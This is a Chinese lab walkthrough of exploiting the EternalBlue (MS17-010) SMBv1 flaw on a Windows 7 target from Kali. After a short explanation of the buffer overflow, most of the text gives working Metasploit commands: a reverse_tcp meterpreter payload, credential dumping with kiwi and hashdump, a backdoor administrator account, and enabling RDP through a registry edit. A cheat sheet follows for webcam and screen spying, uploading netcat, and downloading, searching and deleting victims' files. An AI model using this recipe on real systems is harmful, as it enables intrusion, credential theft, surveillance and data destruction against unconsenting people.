永恒之蓝(ms17-010)过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。

漏洞出现在Windows SMB v1中的内核态函数srv!SrvOs2FeaListToNt在处理FEA(File Extended
Attributes)转换时，在大非分页池(内核的数据结构，Large Non-Paged Kernel
Pool)上存在缓冲区溢出。函数srv!SrvOs2FeaListToNt在将FEA list转换成NTFEA(Windows NT FEA)
list前会调用srv!SrvOs2FeaListSizeToNt去计算转换后的FEA lsit的大小。然后会进行如下操作：

srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小

因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大

因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出

目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows
Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012
SP0。

靶机：Win7 64位 （IP: 172.16.7.180）

攻击机：Kali 64位 （IP：172.16.7.95）

  1. 判断是否存在漏洞

利用Nmap对靶机端口服务进行扫描：nmap -sS -sV -Pn 172.16.7.180

![1667979515_636b58fbc328603f2d24d.png!small](https://image.3001.net/images/20221109/1667979515_636b58fbc328603f2d24d.png!small)

利用ms17010检测工具

![1667979523_636b5903dfb3285e9867b.png!small](https://image.3001.net/images/20221109/1667979523_636b5903dfb3285e9867b.png!small)

2.漏洞利用

启动MSF

Msfconsole

![1667979538_636b59129975d5b547748.png!small](https://image.3001.net/images/20221109/1667979538_636b59129975d5b547748.png!small)

搜索ms17_010漏洞：search ms17_010

![1667979543_636b591734500b8602a45.png!small](https://image.3001.net/images/20221109/1667979543_636b591734500b8602a45.png!small)

进入漏洞模块： use exploit/windows/smb/ms17_010_eternalblue

![1667979548_636b591cdd0347b4af77a.png!small](https://image.3001.net/images/20221109/1667979548_636b591cdd0347b4af77a.png!small)

查看漏洞模块信息：info

![1667979555_636b5923c8a5240236b62.png!small](https://image.3001.net/images/20221109/1667979555_636b5923c8a5240236b62.png!small)

设置攻击目标：set RHOSTS 172.16.7.180

![1667979560_636b5928e1134971750b7.png!small](https://image.3001.net/images/20221109/1667979560_636b5928e1134971750b7.png!small)

查看可用的攻击payload：show payloads

![1667979564_636b592c821849fbefcaa.png!small](https://image.3001.net/images/20221109/1667979564_636b592c821849fbefcaa.png!small)

选择并设置攻击Payload：set payload windows/x64/meterpreter/reverse_tcp

![1667979569_636b5931c69b330d5fb44.png!small](https://image.3001.net/images/20221109/1667979569_636b5931c69b330d5fb44.png!small)

设置接收信息的本地设备：set LHOST 172.16.7.95

![1667979573_636b59357518f9fdfc2c1.png!small](https://image.3001.net/images/20221109/1667979573_636b59357518f9fdfc2c1.png!small)

最后检查下当前的配置：show options

![1667979580_636b593c8b013c1faa644.png!small](https://image.3001.net/images/20221109/1667979580_636b593c8b013c1faa644.png!small)

开始攻击：exploit

![1667979586_636b594251cdd0d44fa27.png!small](https://image.3001.net/images/20221109/1667979586_636b594251cdd0d44fa27.png!small)

直接拿到Win7的Shell，然后任意命令执行

![1667979591_636b59479d701f931e626.png!small](https://image.3001.net/images/20221109/1667979591_636b59479d701f931e626.png!small)

发现用户是管理员

获取用户密码

load kiwi

![1667979598_636b594e9579a291bfb07.png!small](https://image.3001.net/images/20221109/1667979598_636b594e9579a291bfb07.png!small)

完成进程迁移后

creds_all

![1667979606_636b59560bd8dcfdfea62.png!small](https://image.3001.net/images/20221109/1667979606_636b59560bd8dcfdfea62.png!small)

  4. 通过Shell对靶机Win7控制

输入shell切换到控制机dos界面

![1667979614_636b595e06b9a6281e6e8.png!small](https://image.3001.net/images/20221109/1667979614_636b595e06b9a6281e6e8.png!small)

创建新用户hacker

net user hacker 123456 /add

![1667979619_636b596335ddffbb1c912.png!small](https://image.3001.net/images/20221109/1667979619_636b596335ddffbb1c912.png!small)

将hacker用户提升至管理员权限

net localgroup administrators hacker /add

![1667979624_636b596861ebb6f202608.png!small](https://image.3001.net/images/20221109/1667979624_636b596861ebb6f202608.png!small)

输入 net localgroup administrators查看管理员都有谁

![1667979632_636b5970e1413957b5525.png!small](https://image.3001.net/images/20221109/1667979632_636b5970e1413957b5525.png!small)

开启Win7的远程桌面控制

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"
/v fDenyTSConnections /t REG_DWORD /d 0 /f

![1667979637_636b5975d7386482b746b.png!small](https://image.3001.net/images/20221109/1667979637_636b5975d7386482b746b.png!small)

以上都设置完整后，就可以在kali上远程连接Win7进行控制了

rdesktop 172.16.7.180:3389

![1667979643_636b597bc76ab2cdedc14.png!small](https://image.3001.net/images/20221109/1667979643_636b597bc76ab2cdedc14.png!small)

 **开启摄像头 webcam_stream**

 **截取屏幕 screenshot**

 **屏幕监控 run vnc （若对方电脑上有安全软件会不稳定或者失败）**

 **建用户并添加到管理员组中，然后查看创建的用户权限**

 **net user test test123 /add**

 **net localgroup administrators test /add**

 **进入对方 shell**

 **下载文件 download filepath**

 **上传文件 upload 本机path 对方path**

 **获得密码 hashdump**

 **开启3389远程桌面 run post/windows/manage/enable_rdp**

 **kali 远程windows桌面 rdesktop -x test 192.168.88.134**

 **#用于屏幕监控 启动攻击exploit**

 **1:set payload windows/x64/vncinject/bind_tcp**

2.文件系统命令

cat c:\boot.ini#查看文件内容,文件必须存在

del c:\boot.ini #删除指定的文件

upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload setup.exe
C:\\\windows\\\system32\

download nimeia.txt /root/Desktop/ # 下载文件到本机上如：download C:\\\boot.ini
/root/或者download
C:\\\"ProgramFiles"\\\Tencent\\\QQ\\\Users\\\295******125\\\Msg2.0.db /root/

edit c:\boot.ini # 编辑文件

getlwd#打印本地目录

getwd#打印工作目录

lcd#更改本地目录

ls#列出在当前目录中的文件列表

lpwd#打印本地目录

pwd#输出工作目录

cd c:\\\ #进入目录文件下

rm file #删除文件

mkdir dier #在受害者系统上的创建目录

rmdir#受害者系统上删除目录

dir#列出目标主机的文件和文件夹信息

mv#修改目标主机上的文件名

search -d d:\\\www -f web.config #search 文件，如search -d c:\\\ -f*.doc

meterpreter > search -f autoexec.bat #搜索文件

meterpreter > search -f sea*.bat c:\\\xamp\\\

enumdesktops #用户登录数

1)下载文件

使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件

(2)上传文件

“upload”命令为上传文件到我们的目标机器，在图中我们上传了ll.txt到目标机器的c:\pp\下。

(3)查看文件

“cat filename”在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。

(4)切换、查询当前路径

“pwd”命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径，如下图中cd ..为切换到当前路径下的上一目录。  
  
---
